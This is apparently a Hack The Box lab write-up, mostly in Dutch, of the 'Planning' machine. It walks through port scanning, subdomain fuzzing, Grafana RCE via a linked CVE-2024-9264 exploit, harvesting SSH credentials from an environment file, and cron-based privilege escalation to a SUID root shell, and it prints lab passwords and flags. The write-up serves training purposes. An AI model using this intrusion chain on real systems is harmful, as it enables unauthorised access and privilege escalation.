
Machine Information

As is common in real life pentests, you will start the Planning box with credentials for the following account: admin / 0D5oT70Fq13EvB5r
This account can be used to login on the webpage.
# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
nmap -p- 10.129.226.83
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-13 03:24 CEST
Nmap scan report for 10.129.226.83
Host is up (0.019s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.53 seconds

```

### Detailed port scan

At the gedetialized port scan go to get more information from the services who are open on the ip address.

```
nmap -p22,80 -sCV 10.129.226.83 -vvvv
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-13 03:26 CEST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 03:26
Completed NSE at 03:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 03:26
Completed NSE at 03:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 03:26
Completed NSE at 03:26, 0.00s elapsed
Initiating Ping Scan at 03:26
Scanning 10.129.226.83 [4 ports]
Completed Ping Scan at 03:26, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 03:26
Completed Parallel DNS resolution of 1 host. at 03:26, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 03:26
Scanning 10.129.226.83 [2 ports]
Discovered open port 80/tcp on 10.129.226.83
Discovered open port 22/tcp on 10.129.226.83
Completed SYN Stealth Scan at 03:26, 0.06s elapsed (2 total ports)
Initiating Service scan at 03:26
Scanning 2 services on 10.129.226.83
Completed Service scan at 03:26, 6.06s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.226.83.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 03:26
Completed NSE at 03:26, 1.43s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 03:26
Completed NSE at 03:26, 0.22s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 03:26
Completed NSE at 03:26, 0.00s elapsed
Nmap scan report for 10.129.226.83
Host is up, received echo-reply ttl 63 (0.021s latency).
Scanned at 2025-05-13 03:26:19 CEST for 8s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMv/TbRhuPIAz+BOq4x+61TDVtlp0CfnTA2y6mk03/g2CffQmx8EL/uYKHNYNdnkO7MO3DXpUbQGq1k2H6mP6Fg=
|   256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKpJkWOBF3N5HVlTJhPDWhOeW+p9G7f2E9JnYIhKs6R0
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 03:26
Completed NSE at 03:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 03:26
Completed NSE at 03:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 03:26
Completed NSE at 03:26, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.19 seconds
           Raw packets sent: 6 (240B) | Rcvd: 5 (196B)
```

Hierboven kan je zien dat er een url te zien is die dat niet worden geredirect. De url zal je dus moeten toevoegen aan de hosts file.

```
cat /etc/hosts

10.129.226.83 planning.htb
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
```

Nu dat de url is toegevoegd, kan je naar de webpagina gaan surfen, dan kom je op de volgende pagina terecht.

![[Pasted image 20250512194916.png]]

Ik heb gezien dat ik niets kan doen op deze webpage, ik ben dus Subdomain discovery gaan doen.

## Subdomain Discovery

Ik ben gaan fuzzen op subdomains. Dit ben ik gaan doen door het volgende commando.

```
wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u 'http://planning.htb/' -H "Host: FUZZ.planning.htb" --hw 12
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://planning.htb/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                  
=====================================================================

000024093:   302        2 L      2 W        29 Ch       "grafana"                                
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 221.7918
Processed Requests: 56125
Filtered Requests: 56124
Requests/sec.: 253.0526
```

Ik ben deze dus gaan toevoegen aan de hosts file voor het zien of ik daarnaar kan surfen. Zoals je hieronder kunt zien kan ik naar de webpagina http://grafana.planning.htb surfen.

![[Pasted image 20250512200427.png]]

Ik zal nu dus de credentials gaan gebruiken die dat in de machine information mee werden gegeven voor het zien of dat ik met die credentials in kan loggen. Zoals je hieronder zult kunnen zien kan ik inloggen met de credentials die dat we al hadden.

![[Pasted image 20250512200625.png]]

Nu ben ik dus gaan zoeken naar de versie van grafana die dat op deze webversie wordt gedraaid, Dit zodat ik deze kan gaan gebruiken naar het zoeken van een exploit. Als je rechts boven op het vraagteken klikt dan kan je zien dat de grafana op deze webserver versie v11.0.0 heeft.
Ik ben nu dus gaan zoeken naar een exploit die dat ik kan gebruiken voor deze versie van grafana en hierbij ben ik op de volgende exploit gekomen. https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit

Deze exploit ben ik gaan gebruiken voor toegang te krijgen tot de server van grafana.

![[Pasted image 20250512202036.png]]

Na het zoeken ben ik op de volgende path ben gekomen waardat ik de user credentials voor de ssh login heb gevonden.

```
cat environ 
AWS_AUTH_SESSION_DURATION=15mHOSTNAME=7ce659d667d7PWD=/usr/share/grafanaAWS_AUTH_AssumeRoleEnabled=trueGF_PATHS_HOME=/usr/share/grafanaAWS_CW_LIST_METRICS_PAGE_LIMIT=500HOME=/usr/share/grafanaAWS_AUTH_EXTERNAL_ID=SHLVL=1GF_PATHS_PROVISIONING=/etc/grafana/provisioningGF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!GF_SECURITY_ADMIN_USER=enzoGF_PATHS_DATA=/var/lib/grafanaGF_PATHS_LOGS=/var/log/grafanaPATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binAWS_AUTH_AllowedAuthProviders=default,keys,credentialsGF_PATHS_PLUGINS=/var/lib/grafana/pluginsGF_PATHS_CONFIG=/etc/grafana/grafana.ini_=/usr/bin/sh# cd /usr/share/grafana
```

In deze code kan je de volgende credentials zien.

| Username | Password          |
| -------- | ----------------- |
| enzo     | RioTecRANDEntANT! |

## Login as Enzo

```
ssh enzo@planning.htb     
enzo@planning.htb's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon May 12 06:40:20 PM UTC 2025

  System load:           0.06
  Usage of /:            66.8% of 6.30GB
  Memory usage:          42%
  Swap usage:            0%
  Processes:             231
  Users logged in:       0
  IPv4 address for eth0: 10.129.226.83
  IPv6 address for eth0: dead:beef::250:56ff:fe94:f2e2


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Mon May 12 18:40:21 2025 from 10.10.16.26
enzo@planning:~$ 

```

User flag: b5117b425ca81b9ce26e78199247b593

```
enzo@planning:~$ cat user.txt
b5117b425ca81b9ce26e78199247b593
```

Did some Linpeas on the ssh server and there i found out that the localhost is running a webserver on port 8000. So i did some port forwarding to this webpage by this ssh command:

```
ssh enzo@planning.htb -L 8000:127.0.0.1:8000
enzo@planning.htb's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon May 12 07:04:51 PM UTC 2025

  System load:           0.0
  Usage of /:            67.1% of 6.30GB
  Memory usage:          53%
  Swap usage:            0%
  Processes:             234
  Users logged in:       0
  IPv4 address for eth0: 10.129.226.83
  IPv6 address for eth0: dead:beef::250:56ff:fe94:f2e2


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon May 12 19:04:52 2025 from 10.10.16.26
enzo@planning:~$
```

Now i 


```
cat crontab.db 
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}

```

Ben ik gegaan naar de webpagina die dat ik zonet heb geforward met de port forwarding. Daar kan je nu dus een nieuwe cronjob gaan maken die dat je code doorpushed naar de ssh server.

![[Pasted image 20250512213331.png]]

Hiermee kunnen we erna op de ssh server een /bin/bash shell starten als root user en zo kan je dan de root flag behalen.

```
enzo@planning:~$ /tmp/bash -p
bash-5.2# ls
linpeas_linux_amd64  user.txt
```


Root Flag: a6d634d2189b17cb3aa07d28fe521002

```
cat root.txt
a6d634d2189b17cb3aa07d28fe521002
```

![[Pasted image 20250512213451.png]]